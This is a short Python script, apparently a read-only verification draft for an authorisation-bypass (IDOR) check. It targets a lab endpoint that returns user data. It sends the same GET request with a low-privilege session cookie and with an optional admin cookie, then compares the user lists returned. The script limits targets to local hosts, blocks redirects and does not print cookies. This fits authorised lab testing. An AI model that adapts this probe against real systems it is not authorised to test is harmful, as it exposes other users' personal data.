#!/usr/bin/env python3
"""AUTH-001-F1 越权读取用户资料验证草案（只读优先）。

仅允许访问本机授权靶场；会话 Cookie 由本地文件提供，不打印内容。
依赖：Python 3.8+ 标准库（argparse/json/urllib）。
"""
import argparse
import json
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(req.full_url, code,
                                     "redirect blocked: %s" % newurl, headers, fp)


def check_base_url(raw):
    parsed = urllib.parse.urlsplit(raw)
    if parsed.scheme not in ("http", "https"):
        raise SystemExit("only http/https is allowed")
    host = parsed.hostname or ""
    if host not in ALLOWED_HOSTS:
        raise SystemExit("host %r is not an authorised local target" % host)
    return raw.rstrip("/")


def read_cookie(path):
    with open(path, "r", encoding="utf-8") as fh:
        value = fh.read().strip()
    if not value:
        raise SystemExit("empty session file: %s" % path)
    return value


def build_opener():
    return urllib.request.build_opener(NoRedirect())


def http_get(opener, url, cookie, timeout):
    req = urllib.request.Request(url, method="GET")
    req.add_header("Accept", "application/json")
    req.add_header("Cookie", cookie)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def summarise(body):
    try:
        data = json.loads(body)
    except ValueError:
        return "non-JSON response (first 200 chars): %r" % body[:200]
    if isinstance(data, dict):
        return "object response: keys=%s" % sorted(data.keys())
    if isinstance(data, list):
        ids = [row.get("user_id") for row in data if isinstance(row, dict)]
        names = [row.get("first_name") for row in data if isinstance(row, dict)]
        return "array response: %d records, user_id=%s, first_name=%s" % (
            len(data), ids, names)
    return "other JSON type: %s" % type(data).__name__


def main():
    ap = argparse.ArgumentParser(description="AUTH-001-F1 read-only IDOR draft")
    ap.add_argument("--base-url", default="http://127.0.0.1",
                    help="lab base URL; only local hosts are accepted")
    ap.add_argument("--path", default="/vulnerabilities/authbypass/get_user_data.php")
    ap.add_argument("--session-file", required=True,
                    help="local file holding the low-privilege Cookie header")
    ap.add_argument("--admin-session-file", default=None,
                    help="optional local file holding the admin Cookie header")
    ap.add_argument("--security-cookie", default=None,
                    help="optional extra pair such as security=low")
    ap.add_argument("--timeout", type=float, default=5.0)
    args = ap.parse_args()

    base = check_base_url(args.base_url)
    url = base + args.path
    cookie = read_cookie(args.session_file)
    if args.security_cookie:
        cookie = cookie + "; " + args.security_cookie
    opener = build_opener()

    print("[1] target: %s" % url)
    print("[2] low-privilege request (extra cookie: %s)" % (
        "none" if not args.security_cookie else "provided"))
    status, body = http_get(opener, url, cookie, args.timeout)
    print("    HTTP %s" % status)
    print("    observation: %s" % summarise(body))

    if args.admin_session_file:
        admin_cookie = read_cookie(args.admin_session_file)
        if args.security_cookie:
            admin_cookie = admin_cookie + "; " + args.security_cookie
        print("[3] admin control request")
        status2, body2 = http_get(opener, url, admin_cookie, args.timeout)
        print("    HTTP %s" % status2)
        print("    observation: %s" % summarise(body2))

    print("[4] Only a full user list returned to the low-privilege session, "
          "matching the admin control, indicates missing object/action "
          "authorisation. HTTP 200 alone proves nothing.")


if __name__ == "__main__":
    main()
